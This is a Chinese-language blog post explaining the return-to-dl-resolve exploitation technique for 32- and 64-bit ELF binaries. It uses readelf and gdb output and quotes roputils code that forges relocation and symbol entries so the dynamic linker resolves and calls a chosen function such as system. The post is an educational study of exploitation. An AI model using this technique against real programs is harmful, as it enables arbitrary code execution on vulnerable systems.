<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8" />
  
  <title>return to dl-resolve | Another&#39;s blog</title>
  <meta name="author" content="another" />

  
  <meta name="description" content="我们都知道，ELF在执行时，许多函数的地址是lazy binding的，即在第一次调用时才会解析其地址并填充至.got.plt。对于具体这一解析过程是如何完成的，之前并不怎么了解，只知道是在.plt中完成。其实之前Tiger有告诉我有一个名为roputils的工具，利用的就是构造所需信息，直接解析得" />
  

  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

  <meta property="og:title" content="return to dl-resolve" />
  <meta property="og:site_name" content="Another&#39;s blog" />

  
  

  
    <meta property="og:image" content="" />
  

  
  <link href="/css/images/favicon.ico" rel="icon" />
  

  <link rel="alternate" href="/atom.xml" title="Another&#39;s blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  


  <!-- baidu webmaster push -->
  <script src='//push.zhanzhang.baidu.com/push.js'></script>

</head>


<body>
  <header id="header" class="inner"><div class="alignleft">
  <h1><a href="/">Another&#39;s blog</a></h1>
  <h2><a href="/"></a></h2>
</div>
<nav id="main-nav" class="alignright">
  <ul>
    
      <li><a href="/">Home</a></li>
    
      <li><a href="/archives">Archives</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div></header>
  <div id="content" class="inner">
    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.118Z"><a href="/2018/10/21/rtd/">2018-10-21</a></time>
      
      
  
    <h1 class="title">return to dl-resolve</h1>
  

    </header>
    <div class="entry">
      
        <p>我们都知道，ELF在执行时，许多函数的地址是lazy binding的，即在第一次调用时才会解析其地址并填充至.got.plt。对于具体这一解析过程是如何完成的，之前并不怎么了解，只知道是在.plt中完成。其实之前Tiger有告诉我有一个名为roputils的工具，利用的就是构造所需信息，直接解析得到system的地址进而ROP。但直到最近才去研究其代码，搞明白这一技术，即return to dl-resolve，具体是怎么回事。</p>
<p>关于这一技术，在phrack的某一期有具体介绍。在此，我们首先以32位为例，阐述其基本原理；之后则会分析64位环境下这一技术的一些注意点。</p>
<p>32位环境下return to dl-resolve<br>ELF文件的.dynamic section里包含了ld.so用于运行时解析函数地址的信息。其内容示例如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -d bof32</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0x614 contains 24 entries:</span><br><span class="line">Tag        Type                         Name/Value</span><br><span class="line">0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line">0x0000000c (INIT)                       0x80482b0</span><br><span class="line">0x0000000d (FINI)                       0x80484f4</span><br><span class="line">0x00000019 (INIT_ARRAY)                 0x8049608</span><br><span class="line">0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line">0x0000001a (FINI_ARRAY)                 0x804960c</span><br><span class="line">0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line">0x6ffffef5 (GNU_HASH)                   0x804818c</span><br><span class="line">0x00000005 (STRTAB)                     0x804820c</span><br><span class="line">0x00000006 (SYMTAB)                     0x80481ac</span><br><span class="line">0x0000000a (STRSZ)                      80 (bytes) 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line">0x00000015 (DEBUG)                      0x0</span><br><span class="line">0x00000003 (PLTGOT)                     0x8049700</span><br><span class="line">0x00000002 (PLTRELSZ)                   32 (bytes)</span><br><span class="line">0x00000014 (PLTREL)                     REL</span><br><span class="line">0x00000017 (JMPREL)                     0x8048290</span><br><span class="line">0x00000011 (REL)                        0x8048288</span><br><span class="line">0x00000012 (RELSZ)                      8 (bytes)</span><br><span class="line">0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line">0x6ffffffe (VERNEED)                    0x8048268</span><br><span class="line">0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line">0x6ffffff0 (VERSYM)                     0x804825c</span><br><span class="line">0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure></p>
<p>其中的JMPREL segment，对应于.rel.plt section，是用来保存运行时重定位表的。它与.rel.dyn类似，只不过.rel.plt是用于函数重定位，.rel.dyn是用于变量重定位。具体地，其内容如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -r bof32</span><br><span class="line"></span><br><span class="line">Relocation section &apos;.rel.dyn&apos; at offset 0x288 contains 1 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">080496fc  00000206 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line"></span><br><span class="line">Relocation section &apos;.rel.plt&apos; at offset 0x290 contains 4 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">0804970c  00000107 R_386_JUMP_SLOT   00000000   read</span><br><span class="line">08049710  00000207 R_386_JUMP_SLOT   00000000   __gmon_start__</span><br><span class="line">08049714  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main</span><br><span class="line">08049718  00000407 R_386_JUMP_SLOT   00000000   write</span><br></pre></td></tr></table></figure></p>
<p>可以看到，.rel.plt里包含4个条目。事实上，之前.dynamic section中的PLTRELSZ即为.rel.plt的总大小，32 bytes；PLTREL则指明这些条目的类型为REL；RELENT指明了每个REL类型条目的大小，8 bytes。于是32/8=4即为条目个数。</p>
<p>这些条目的类型是Elf32_Rel，其定义如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef uint32_t Elf32_Addr;</span><br><span class="line">typedef uint32_t Elf32_Word;</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">Elf32_Addr    r_offset;               /* Address */</span><br><span class="line">Elf32_Word    r_info;                 /* Relocation type and symbol index */</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line">#define ELF32_R_SYM(val) ((val) &gt;&gt; 8)</span><br><span class="line">#define ELF32_R_TYPE(val) ((val) &amp; 0xff)</span><br></pre></td></tr></table></figure></p>
<p>我们以.rel.plt第一条，即read的条目为例，对比调试器显示的结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/2x 0x8048290</span><br><span class="line">0x8048290:      0x0804970c      0x00000107</span><br></pre></td></tr></table></figure></p>
<p>显示的结果与之前$ readelf -r的结果是相符的。具体地，r_offset即为该函数在.got.plt中的地址:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/3i read</span><br><span class="line">0x80482f0 &lt;read@plt&gt;:        jmp    DWORD PTR ds:0x804970c</span><br><span class="line">   0x80482f6 &lt;read@plt+6&gt;:      push   0x0</span><br><span class="line">   0x80482fb &lt;read@plt+11&gt;:     jmp    0x80482e0</span><br></pre></td></tr></table></figure></p>
<p>而r_info则保存的是其类型和符号序号。根据宏的定义，可知对于此条目，其类型为ELF32_R_TYPE(r_info)=7，对应于R_386_JUMP_SLOT；其symbol index则为RLF32_R_SYM(r_info)=1。</p>
<p>注意到之前$ readelf -r所得到的结果中，包含有Sym.Value和Sym. Name信息。而这些信息就是通过symbol index找到的。具体地，.dynamic section中的SYMTAB，即.dynsym section，保存的便是相关的符号信息。每一条symbol信息的大小在SYMENT中体现，为16 bytes。通过$ readelf -s来查看其内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -s bof32</span><br><span class="line"></span><br><span class="line">Symbol table &apos;.dynsym&apos; contains 6 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 (2)</span><br><span class="line">     2: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     3: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)</span><br><span class="line">     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.0 (2)</span><br><span class="line">     5: 0804850c     4 OBJECT  GLOBAL DEFAULT   15 _IO_stdin_used</span><br><span class="line"></span><br><span class="line">Symbol table &apos;.symtab&apos; contains 74 entries:</span><br></pre></td></tr></table></figure></p>
<p>(注意我们这里只看.dynsym，因为它是运行时所需的。诸如export/import的符号信息全在这里。而.symtab是编译时的符号信息，这部分在strip之后会被删除掉。)</p>
<p>可以看到，之前所说的read函数的符号信息条目index确实为1。我们通过调试器来看看其实际内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/4x 0x80481ac+16</span><br><span class="line">0x80481bc:      0x0000001a      0x00000000      0x00000000      0x00000012</span><br></pre></td></tr></table></figure></p>
<p>对比符号条目的定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">Elf32_Word    st_name;   /* Symbol name (string tbl index) */</span><br><span class="line">Elf32_Addr    st_value;  /* Symbol value */</span><br><span class="line">Elf32_Word    st_size;   /* Symbol size */</span><br><span class="line">unsigned char st_info;   /* Symbol type and binding */</span><br><span class="line">unsigned char st_other;  /* Symbol visibility under glibc&gt;=2.2 */</span><br><span class="line">Elf32_Section st_shndx;  /* Section index */</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure></p>
<p>其结果与$ readelf -r, $ readelf -s的结果相符。具体地，st_name保存的是该符号名称在STRTAB，即.dynstr中的地址：</p>
<p>gdb-peda$ x/s 0x804820c+0x1a<br>0x8048226:      “read”<br>而对于其他项，如st_info，st_other等，我还没搞明白对应的意义。但在实际构造时，只需选择和其他相同的值应该即可。</p>
<p>OK，以上便是相关背景知识。现在我们来看看在call read@plt时具体发生了什么。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/3i read</span><br><span class="line">0x80482f0 &lt;read@plt&gt;:        jmp    DWORD PTR ds:0x804970c</span><br><span class="line">   0x80482f6 &lt;read@plt+6&gt;:      push   0x0</span><br><span class="line">   0x80482fb &lt;read@plt+11&gt;:     jmp    0x80482e0</span><br><span class="line">gdb-peda$ x/wx 0x804970c</span><br><span class="line">0x804970c &lt;read@got.plt&gt;:       0x080482f6</span><br><span class="line">gdb-peda$ x/2i 0x80482e0</span><br><span class="line">   0x80482e0:   push   DWORD PTR ds:0x8049704</span><br><span class="line">   0x80482e6:   jmp    DWORD PTR ds:0x8049708</span><br></pre></td></tr></table></figure></p>
<p>在第一次调用时，jmp <a href="mailto:read@got.plt" target="_blank" rel="noopener">read@got.plt</a>会跳回read@plt，这是我们已经知道的。接下来，会将参数push到栈上并跳至.got.plt+0x8，这相当于调用以下函数：</p>
<p>_dl_runtime_resolve(link_map, rel_offset);<br>_dl_runtime_resolve则会完成具体的符号解析，填充结果，和调用的工作。具体地。根据rel_offset，找到重定位条目：</p>
<p>Elf32_Rel * rel_entry = JMPREL + rel_offset;<br>根据rel_entry中的符号表条目编号，得到对应的符号信息：</p>
<p>Elf32_Sym <em>sym_entry = SYMTAB[ELF32_R_SYM(rel_entry-&gt;r_info)];<br>再找到符号信息中的符号名称：<br>char </em>sym_name = STRTAB + sym_entry-&gt;st_name;<br>由此名称，搜索动态库。找到地址后，填充至.got.plt对应位置。最后调整栈，调用这一解析得到的函数。<br>于是，我们的思路是，提供一个很大的数作为rel_offset给_dl_runtime_resolve，使得找到rel_entry落在我们可控制的区域内。同理，构造伪条目，使得所对应的符号信息、符号的名称，均落在我们可控的区域内，那么就可以解析我们所需的函数地址并调用了。值得注意的是，在解析过程中，还会对ELF32_R_TYPE(rel_entry-&gt;r_info)等进行检查。但这些数据我们只需仿照正常的来构造即可，重点是对应的伪条目的index应计算正确。<br>作为实例，我们来看看roputils里是如何构造伪条目的。首先是函数dl_resolve_data。其定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    def dl_resolve_data(self, base, name):</span><br><span class="line">jmprel = self.dynamic(&apos;JMPREL&apos;)</span><br><span class="line">relent = self.dynamic(&apos;RELENT&apos;)</span><br><span class="line">symtab = self.dynamic(&apos;SYMTAB&apos;)</span><br><span class="line">syment = self.dynamic(&apos;SYMENT&apos;)</span><br><span class="line">strtab = self.dynamic(&apos;STRTAB&apos;)</span><br><span class="line"></span><br><span class="line">addr_reloc, padlen_reloc = self.align(base, jmprel, relent)</span><br><span class="line">addr_sym, padlen_sym = self.align(addr_reloc+relent, symtab, syment)</span><br><span class="line">addr_symstr = addr_sym + syment</span><br><span class="line"></span><br><span class="line">r_info = (((addr_sym - symtab) / syment) &lt;&lt; 8) | 0x7</span><br><span class="line">st_name = addr_symstr - strtab</span><br><span class="line"></span><br><span class="line">buf = self.fill(padlen_reloc)</span><br><span class="line">buf += struct.pack(&apos;&lt;II&apos;, base, r_info)                      # Elf32_Rel</span><br><span class="line">buf += self.fill(padlen_sym)</span><br><span class="line">buf += struct.pack(&apos;&lt;IIII&apos;, st_name, 0, 0, 0x12)             # Elf32_Sym</span><br><span class="line">buf += self.string(name)</span><br><span class="line"></span><br><span class="line">return buf</span><br></pre></td></tr></table></figure></p>
<p>从base开始便是用户可控的区域，也是用来构造伪Elf32_Rel, 伪Elf32_Sym，和符号名称的地方。具体的存放地址，还是根据数组条目的大小进行了对齐。而需要检查的地方，则全部硬编码了，只需计算这些伪条目对应在数组中的index填充即可。</p>
<p>其次便是函数dl_resolve_call了。其定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    def dl_resolve_call(self, base, *args):</span><br><span class="line">jmprel = self.dynamic(&apos;JMPREL&apos;)</span><br><span class="line">relent = self.dynamic(&apos;RELENT&apos;)</span><br><span class="line"></span><br><span class="line">addr_reloc, padlen_reloc = self.align(base, jmprel, relent)</span><br><span class="line">reloc_offset = addr_reloc - jmprel</span><br><span class="line"></span><br><span class="line">buf = self.p(self.plt())</span><br><span class="line">buf += self.p(reloc_offset)</span><br><span class="line">buf += self.p(self.gadget(&apos;pop&apos;, n=len(args)))</span><br><span class="line">buf += self.p(args)</span><br><span class="line"></span><br><span class="line">return buf</span><br></pre></td></tr></table></figure></p>
<p>可以看到，这里将所调用的函数的参数及返回的gadget放在栈上，再往上便是构造的伪Elf32_Rel条目的offset，最后则是.plt起始处的地址，在那里会完成将link_map放至栈上及调用_dl_runtime_resolve。</p>
<p>64位环境下return to dl-resolve<br>相比32位，其实基本原理还是相同的。只是由于位数增加，一些结构体发生变化；此外，函数参数也变成由寄存器传递而非栈传递。</p>
<p>具体地，我们看64位relocation entry的定义。首先通过$ readelf -d可知，现在的类型为RELA，大小RELAENT为24 bytes：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -d bof64</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0x7b0 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]</span><br><span class="line"> 0x000000000000000c (INIT)               0x4003e0</span><br><span class="line"> 0x000000000000000d (FINI)               0x400634</span><br><span class="line"> 0x0000000000000019 (INIT_ARRAY)         0x600798</span><br><span class="line"> 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)</span><br><span class="line"> 0x000000000000001a (FINI_ARRAY)         0x6007a0</span><br><span class="line"> 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)</span><br><span class="line"> 0x000000006ffffef5 (GNU_HASH)           0x400260</span><br><span class="line"> 0x0000000000000005 (STRTAB)             0x4002f8</span><br><span class="line"> 0x0000000000000006 (SYMTAB)             0x400280</span><br><span class="line"> 0x000000000000000a (STRSZ)              67 (bytes)</span><br><span class="line"> 0x000000000000000b (SYMENT)             24 (bytes)</span><br><span class="line"> 0x0000000000000015 (DEBUG)              0x0</span><br><span class="line"> 0x0000000000000003 (PLTGOT)             0x600988</span><br><span class="line"> 0x0000000000000002 (PLTRELSZ)           96 (bytes)</span><br><span class="line"> 0x0000000000000014 (PLTREL)             RELA</span><br><span class="line"> 0x0000000000000017 (JMPREL)             0x400380</span><br><span class="line"> 0x0000000000000007 (RELA)               0x400368</span><br><span class="line"> 0x0000000000000008 (RELASZ)             24 (bytes)</span><br><span class="line"> 0x0000000000000009 (RELAENT)            24 (bytes)</span><br><span class="line"> 0x000000006ffffffe (VERNEED)            0x400348</span><br><span class="line"> 0x000000006fffffff (VERNEEDNUM)         1</span><br><span class="line"> 0x000000006ffffff0 (VERSYM)             0x40033c</span><br><span class="line"> 0x0000000000000000 (NULL)               0x0</span><br></pre></td></tr></table></figure></p>
<p>其定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef __u16   Elf64_Half;</span><br><span class="line">typedef __u32   Elf64_Word;</span><br><span class="line">typedef __u64   Elf64_Addr;</span><br><span class="line">typedef __u64   Elf64_Xword;</span><br><span class="line">typedef __s64   Elf64_Sxword;</span><br><span class="line"></span><br><span class="line">typedef struct elf64_rela &#123;</span><br><span class="line">Elf64_Addr r_offset;  /* Location at which to apply the action */</span><br><span class="line">Elf64_Xword r_info;   /* index and type of relocation */</span><br><span class="line">Elf64_Sxword r_addend;    /* Constant addend used to compute value */</span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line">#define ELF64_R_SYM(i) ((i) &gt;&gt; 32)</span><br><span class="line">#define ELF64_R_TYPE(i) ((i) &amp; 0xffffffff)</span><br></pre></td></tr></table></figure></p>
<p>相应地，在roputils中，64位下构造伪Elf64_Rela的代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r_info = (((addr_sym - symtab) / syment) &lt;&lt; 32) | 0x7</span><br><span class="line"></span><br><span class="line">buf += struct.pack(&apos;&lt;QQQ&apos;, base, r_info, 0)                  # Elf64_Rela</span><br></pre></td></tr></table></figure>
<p>SYMTAB中的条目定义则变化如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef struct elf64_sym &#123;</span><br><span class="line">Elf64_Word st_name;       /* Symbol name, index in string tbl */</span><br><span class="line">unsigned char st_info;    /* Type and binding attributes */</span><br><span class="line">unsigned char st_other;   /* No defined meaning, 0 */</span><br><span class="line">Elf64_Half st_shndx;      /* Associated section index */</span><br><span class="line">Elf64_Addr st_value;      /* Value of the symbol */</span><br><span class="line">Elf64_Xword st_size;      /* Associated symbol size */</span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure>
<p>可以看到，st_info，st_other等的位置被提前了。对应于roputils中的代码则为：</p>
<pre><code>buf += struct.pack(&apos;&lt;IIQQ&apos;, st_name, 0x12, 0, 0)             # Elf64_Sym
</code></pre><p>以上便是相关结构的变更情况。接下来，我们看roputils中传递函数参数的相关代码。</p>
<p>首先，看看64位下.plt中解析函数地址的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/3i read</span><br><span class="line">0x400420 &lt;read@plt&gt;: jmp    QWORD PTR [rip+0x200582]        # 0x6009a8 &lt;read@got.plt&gt;</span><br><span class="line">   0x400426 &lt;read@plt+6&gt;:       push   0x1</span><br><span class="line">   0x40042b &lt;read@plt+11&gt;:      jmp    0x400400</span><br><span class="line">gdb-peda$ x/2i 0x400400</span><br><span class="line">   0x400400:    push   QWORD PTR [rip+0x20058a]        # 0x600990</span><br><span class="line">   0x400406:    jmp    QWORD PTR [rip+0x20058c]        # 0x600998</span><br></pre></td></tr></table></figure>
<p>可以看到，给_dl_runtime_resolve传递的参数仍然是两个，但第二个参数已由之前32位的相对JMPREL的偏移变为该条目的在数组中的index。相应地，roputils在这里也进行了改变：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addr_reloc, padlen_reloc = self.align(base, jmprel, relaent)</span><br><span class="line">reloc_offset = (addr_reloc - jmprel) / relaent</span><br><span class="line"></span><br><span class="line">buf = self.p(self.plt())</span><br><span class="line">buf += self.p(reloc_offset)</span><br></pre></td></tr></table></figure>
<p>另外，注意到给_dl_runtime_resolve传递参数的方式，依然是通过栈，而非一般情况下通过寄存器传递。这是因为此时的寄存器rdi等中已经存有要解析的函数所需的参数了。具体地，roputils中是通过某些gadget来将所需的参数，如/bin/sh的地址，保存在寄存器中。</p>
<p>然而，阅读roputils的示例代码，我们发现它还会在解析函数地址之前，将link_map+0x1c8处设为NULL。我们试着去掉这一操作，再执行发现遇到segfault了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x40033c --&gt; 0x2000200020000</span><br><span class="line">RBX: 0x600efc --&gt; 0x600efc66477747</span><br><span class="line">RCX: 0x155dc00000007</span><br><span class="line">RDX: 0x155dc</span><br><span class="line">RSI: 0x600f20 --&gt; 0x1200200c40</span><br><span class="line">RDI: 0x4002f8 --&gt; 0x6f732e6362696c00 (&apos;&apos;)</span><br><span class="line">RBP: 0x0</span><br><span class="line">RSP: 0x600da8 --&gt; 0x0</span><br><span class="line">RIP: 0x7ffff7de9448 (&lt;_dl_fixup+120&gt;:   movzx  eax,WORD PTR [rax+rdx*2])</span><br><span class="line">R8 : 0x600f00 --&gt; 0x600efc --&gt; 0x600efc66477747</span><br><span class="line">R9 : 0x7ffff7dea4e0 (&lt;_dl_fini&gt;:        push   rbp)</span><br><span class="line">R10: 0x7ffff7ffe130 --&gt; 0x0</span><br><span class="line">R11: 0x246</span><br><span class="line">R12: 0x0</span><br><span class="line">R13: 0x0</span><br><span class="line">R14: 0x0</span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x7ffff7de943b &lt;_dl_fixup+107&gt;:      test rax,rax</span><br><span class="line">   0x7ffff7de943e &lt;_dl_fixup+110&gt;:      je     0x7ffff7de9530 &lt;_dl_fixup+352&gt;</span><br><span class="line">   0x7ffff7de9444 &lt;_dl_fixup+116&gt;:      mov    rax,QWORD PTR [rax+0x8]</span><br><span class="line">=&gt; 0x7ffff7de9448 &lt;_dl_fixup+120&gt;:      movzx  eax,WORD PTR [rax+rdx*2]</span><br><span class="line">   0x7ffff7de944c &lt;_dl_fixup+124&gt;:      and    eax,0x7fff</span><br><span class="line">   0x7ffff7de9451 &lt;_dl_fixup+129&gt;:      lea    rdx,[rax+rax*2]</span><br><span class="line">   0x7ffff7de9455 &lt;_dl_fixup+133&gt;:      mov    rax,QWORD PTR [r10+0x2e0]</span><br><span class="line">   0x7ffff7de945c &lt;_dl_fixup+140&gt;:      lea    r8,[rax+rdx*8]</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x600da8 --&gt; 0x0</span><br><span class="line">0008| 0x600db0 --&gt; 0x600f20 --&gt; 0x1200200c40</span><br><span class="line">0016| 0x600db8 --&gt; 0x0</span><br><span class="line">0024| 0x600dc0 --&gt; 0x0</span><br><span class="line">0032| 0x600dc8 --&gt; 0x0</span><br><span class="line">0040| 0x600dd0 --&gt; 0x7ffff7defd00 (&lt;_dl_runtime_resolve+80&gt;:    mov    r11,rax)</span><br><span class="line">0048| 0x600dd8 (&quot;jweM5ZXF&quot;)</span><br><span class="line">0056| 0x600de0 --&gt; 0x0</span><br><span class="line">[------------------------------------------------------------------------------]</span><br></pre></td></tr></table></figure></p>
